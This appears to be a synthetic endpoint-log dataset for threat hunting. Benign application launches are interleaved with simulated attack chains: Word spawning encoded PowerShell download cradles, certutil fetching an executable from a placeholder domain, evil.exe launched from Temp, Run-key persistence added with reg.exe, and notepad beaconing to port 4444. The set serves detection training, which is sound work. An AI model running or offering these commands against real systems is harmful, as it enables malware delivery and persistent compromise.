+2026-04-02 00:24:00,eng-ws-01,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-02 00:25:00,sales-lt-02,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-02 00:26:00,hr-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-02 00:27:00,ops-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-02 00:28:00,hr-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-02 00:29:00,fin-ws-02,charlie,slack.exe,explorer.exe,slack.exe --processStart slack.exe,45.33.32.156,443,slack-client
+2026-04-02 00:30:00,eng-ws-01,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.4.25,0,none
+2026-04-02 00:31:00,fin-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-02 00:32:00,hr-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
+2026-04-02 00:33:00,ops-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-02 00:34:00,ops-ws-01,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-02 00:35:00,sales-lt-01,farah,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
+2026-04-02 00:36:00,fin-ws-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
+2026-04-02 00:37:00,sales-lt-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-02 00:38:00,sales-lt-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-02 00:39:00,eng-ws-02,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",45.33.32.156,443,outlook
+2026-04-02 00:40:00,hr-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",172.16.4.25,445,none
+2026-04-02 00:41:00,ops-ws-01,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,52.95.110.1,443,zoom-client
+2026-04-02 00:42:00,sales-lt-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-02 00:43:00,shared-jump-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-02 00:44:00,sales-lt-01,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
+2026-04-02 00:45:00,ops-ws-02,irfan,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-02 00:46:00,eng-ws-01,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
+2026-04-02 00:47:00,ops-ws-02,julia,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
+2026-04-02 00:47:00,eng-ws-02,george,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
+2026-04-02 00:48:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",10.0.0.10,445,none
+2026-04-02 00:48:00,eng-ws-02,george,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-02 00:49:00,sales-lt-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-02 00:49:00,eng-ws-02,george,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
+2026-04-02 00:50:00,ops-ws-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
+2026-04-02 00:51:00,fin-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,23.45.67.89,443,zoom-client
+2026-04-02 00:52:00,sales-lt-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-02 00:53:00,ops-ws-02,george,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-02 00:54:00,ops-ws-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-02 00:55:00,ops-ws-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",185.199.108.153,443,outlook
+2026-04-02 00:56:00,fin-ws-02,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.0.0.5,0,none
+2026-04-02 00:57:00,fin-ws-02,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-02 00:58:00,hr-ws-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
+2026-04-02 00:59:00,shared-jump-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-02 01:36:00,sales-lt-01,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 01:37:00,sales-lt-01,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 02:11:00,fin-ws-01,alice,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-02 02:12:00,fin-ws-01,alice,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
+2026-04-02 02:13:00,fin-ws-01,alice,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
+2026-04-02 03:06:00,sales-lt-01,charlie,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 03:07:00,sales-lt-01,charlie,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 03:55:00,shared-jump-01,alice,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 03:56:00,shared-jump-01,alice,evil.exe,explorer.exe,C:\Users\alice\AppData\Local\Temp\evil.exe,10.0.1.15,0,none
+2026-04-02 03:57:00,shared-jump-01,alice,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.1.12,0,none
+2026-04-02 04:51:00,ops-ws-02,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-02 04:52:00,ops-ws-02,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
+2026-04-02 04:53:00,ops-ws-02,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
+2026-04-02 05:36:00,sales-lt-02,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
+2026-04-02 05:37:00,sales-lt-02,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-02 05:38:00,sales-lt-02,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-02 06:22:00,sales-lt-02,julia,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 06:23:00,sales-lt-02,julia,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 06:53:00,fin-ws-02,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 06:54:00,fin-ws-02,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,172.16.4.25,0,none
+2026-04-02 06:55:00,fin-ws-02,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.10.8,0,none
+2026-04-02 07:27:00,shared-jump-01,alice,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 07:28:00,shared-jump-01,alice,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 07:52:00,fin-ws-01,irfan,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 07:53:00,fin-ws-01,irfan,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 08:47:00,fin-ws-01,bob,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 08:48:00,fin-ws-01,bob,evil.exe,explorer.exe,C:\Users\bob\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
+2026-04-02 08:49:00,fin-ws-01,bob,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
+2026-04-02 09:27:00,hr-ws-01,alice,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 09:28:00,hr-ws-01,alice,evil.exe,explorer.exe,C:\Users\alice\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
+2026-04-02 09:29:00,hr-ws-01,alice,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.2.20,0,none
+2026-04-02 10:27:00,ops-ws-02,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 10:28:00,ops-ws-02,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 11:07:00,sales-lt-01,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
+2026-04-02 11:08:00,sales-lt-01,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-02 11:09:00,sales-lt-01,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-02 12:03:00,ops-ws-01,bob,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 12:04:00,ops-ws-01,bob,evil.exe,explorer.exe,C:\Users\bob\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
+2026-04-02 12:05:00,ops-ws-01,bob,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.0.5,0,none
+2026-04-02 12:34:00,ops-ws-02,alice,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 12:35:00,ops-ws-02,alice,evil.exe,explorer.exe,C:\Users\alice\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
+2026-04-02 12:36:00,ops-ws-02,alice,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.10.9,0,none
+2026-04-02 12:59:00,shared-jump-01,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
+2026-04-02 13:00:00,shared-jump-01,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-02 13:01:00,shared-jump-01,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-02 13:59:00,sales-lt-01,farah,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
+2026-04-02 14:00:00,sales-lt-01,farah,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
+2026-04-02 14:01:00,sales-lt-01,farah,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-02 14:53:00,sales-lt-02,julia,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 14:54:00,sales-lt-02,julia,evil.exe,explorer.exe,C:\Users\julia\AppData\Local\Temp\evil.exe,192.168.1.12,0,none
+2026-04-02 14:55:00,sales-lt-02,julia,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.4.25,0,none
+2026-04-02 15:46:00,eng-ws-02,diana,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-02 15:47:00,eng-ws-02,diana,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-02 15:48:00,eng-ws-02,diana,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,curl/7.68
+2026-04-02 16:29:00,sales-lt-02,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 16:30:00,sales-lt-02,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 17:00:00,fin-ws-01,helen,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-02 17:01:00,fin-ws-01,helen,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-02 17:02:00,fin-ws-01,helen,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-02 17:51:00,hr-ws-01,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-02 17:52:00,hr-ws-01,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
+2026-04-02 17:53:00,hr-ws-01,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-02 18:41:00,sales-lt-01,diana,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
+2026-04-02 18:42:00,sales-lt-01,diana,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-02 18:43:00,sales-lt-01,diana,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-02 19:32:00,shared-jump-01,bob,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
+2026-04-02 19:33:00,shared-jump-01,bob,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-02 19:34:00,shared-jump-01,bob,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-02 20:29:00,sales-lt-01,alice,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
+2026-04-02 20:30:00,sales-lt-01,alice,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-02 20:31:00,sales-lt-01,alice,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-02 21:29:00,shared-jump-01,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-02 21:30:00,shared-jump-01,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
+2026-04-02 21:31:00,shared-jump-01,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.1.15,0,none
+2026-04-02 22:05:00,fin-ws-01,bob,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 22:06:00,fin-ws-01,bob,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 22:54:00,shared-jump-01,julia,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 22:55:00,shared-jump-01,julia,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-02 23:39:00,ops-ws-02,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-02 23:40:00,ops-ws-02,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 00:19:00,ops-ws-02,farah,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-03 00:20:00,ops-ws-02,farah,evil.exe,explorer.exe,C:\Users\farah\AppData\Local\Temp\evil.exe,10.1.5.12,0,none
+2026-04-03 00:21:00,ops-ws-02,farah,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.1.12,0,none
+2026-04-03 00:52:00,ops-ws-02,julia,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,winhttp
+2026-04-03 00:53:00,ops-ws-02,julia,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-03 00:54:00,ops-ws-02,julia,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-03 01:36:00,sales-lt-02,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 01:37:00,sales-lt-02,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 02:36:00,fin-ws-02,diana,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 02:37:00,fin-ws-02,diana,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 03:14:00,hr-ws-01,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 03:15:00,hr-ws-01,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 03:47:00,fin-ws-01,irfan,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 03:48:00,fin-ws-01,irfan,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 04:46:00,ops-ws-01,bob,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 04:47:00,ops-ws-01,bob,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 05:33:00,sales-lt-01,julia,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 05:34:00,sales-lt-01,julia,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 06:24:00,sales-lt-02,ethan,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 06:25:00,sales-lt-02,ethan,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 07:16:00,sales-lt-02,bob,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-03 07:17:00,sales-lt-02,bob,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-03 07:18:00,sales-lt-02,bob,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-03 07:44:00,eng-ws-01,diana,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 07:45:00,eng-ws-01,diana,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-03 08:26:00,hr-ws-01,ethan,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-03 08:27:00,hr-ws-01,ethan,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,python-requests
+2026-04-03 08:28:00,hr-ws-01,ethan,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-03 09:09:00,sales-lt-02,alice,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,curl/7.68
+2026-04-03 09:10:00,sales-lt-02,alice,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
+2026-04-03 09:11:00,sales-lt-02,alice,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,python-requests
+2026-04-03 10:09:00,sales-lt-02,george,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-03 10:10:00,sales-lt-02,george,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-03 10:11:00,sales-lt-02,george,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-03 10:52:00,eng-ws-01,george,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-03 10:53:00,eng-ws-01,george,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
